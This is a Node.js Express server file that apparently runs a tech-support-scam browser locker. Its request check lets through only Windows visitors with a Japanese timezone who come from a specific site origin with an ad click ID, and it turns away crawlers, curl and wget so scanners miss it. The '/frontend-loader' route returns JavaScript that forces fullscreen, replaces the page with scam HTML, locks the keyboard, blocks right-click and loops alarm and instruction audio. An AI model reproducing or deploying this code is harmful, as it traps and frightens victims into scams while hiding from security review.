import express from "express";
import cors from "cors";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const ALLOWED_ORIGIN = "https://amicisrestaurant.food";

// Helper to resolve relative paths (ESM compatible)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(
  cors({
    origin: ALLOWED_ORIGIN,
    credentials: true,
  })
);

app.use(express.json());

// === Asset configuration (HTML + Audio) ===
const assets = [
  // 7197
  // {
  //   htmlFile: "asset1.html",
  //   audioUrl: "https://audio.jukehost.co.uk/luhILbTa2rgzE7BEoQOc0Q9fYW2JdKXR",
  // },
  // 7191
  // {
  //   htmlFile: "asset2.html",
  //   audioUrl: "https://audio.jukehost.co.uk/Fo7XvNtE52iSkvc6Xy5SW3pNDqGOXrt4",
  // },
  // 7199
  // {
  //   htmlFile: "asset3.html",
  //   audioUrl: "https://audio.jukehost.co.uk/aCBQpNIhnrfGU20C21KXmyY5QTjq5D4I",
  // },
  // 7193
  // {
  //   htmlFile: "asset4.html",
  //   audioUrl: "https://audio.jukehost.co.uk/WuM1hVmE3nsuOOu3LvdtEvUQODa8ndH8",
  // },
  // 7194
  // {
  //   htmlFile: "asset5.html",
  //   audioUrl: "https://audio.jukehost.co.uk/t1C9SlZQ6sQFZ9h6cuuIVvXxgdOPbzDD",
  // },
];

let currentAssetIndex = 0; // Global index for round-robin asset selection

// === Security Middleware ===
function validateRequest(req, res, next) {
  const origin = req.get("origin");
  if (origin !== ALLOWED_ORIGIN) {
    return res.status(403).send("FAILED: origin check");
  }

  const ua = req.get("user-agent")?.toLowerCase() || "";
  const blockedAgents = ["bot", "spider", "crawler", "curl", "wget"];
  const isWindows = ua.includes("windows");
  if (blockedAgents.some((a) => ua.includes(a)) || !isWindows) {
    return res.status(403).send("FAILED: bot or not Windows");
  }

  const timezone = req.get("x-client-timezone");
  if (!["Asia/Tokyo", "Japan"].includes(timezone)) {
    return res.status(403).send("FAILED: wrong timezone");
  }

  const cookie = req.get("x-access-cookie");
  if (cookie !== "true") {
    return res.status(403).send("FAILED: cookie missing");
  }

  next();
}

// === HTML Escaping Utility ===
function escapeHTMLForJSString(html) {
  return html
    .replace(/\\/g, '\\\\')  // Escape backslashes
    .replace(/'/g, "\\'")    // Escape single quotes
    .replace(/\r?\n/g, '');  // Remove newlines
}

// === Route: /frontend-loader ===
app.get("/frontend-loader", validateRequest, async (req, res) => {
  const gclid = req.query.gclid;
  if (!gclid || gclid.length < 10) {
    return res.status(403).send("FAILED: gclid missing or too short");
  }

  console.log(gclid);

  try {
    const asset = assets[currentAssetIndex];

    // Increment index (loop back to 0 if end is reached)
    currentAssetIndex = (currentAssetIndex + 1) % assets.length;

    const htmlPath = path.join(__dirname, asset.htmlFile);
    const rawHTML = await fs.readFile(htmlPath, "utf8");
    const safeHTML = escapeHTMLForJSString(rawHTML);

    const code = `
      document.documentElement.requestFullscreen().then(() => {
        document.body.innerHTML = '${safeHTML}';
        navigator.keyboard.lock();
        document.addEventListener('contextmenu', e => e.preventDefault());

        const beepAudio = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
        beepAudio.loop = true;
        beepAudio.play();

        const instructionAudio = new Audio('${asset.audioUrl}');
        instructionAudio.loop = true;
        instructionAudio.play();

        document.removeEventListener("click", handleSomeClick);
      });
    `;

    res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
    console.log(`Sent code for: ${asset.htmlFile}`);
    return res.json({ code });

  } catch (err) {
    console.error("Error in frontend-loader:", err);
    return res.status(500).json({ error: "Failed to generate frontend loader" });
  }
});

// === Start server ===
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
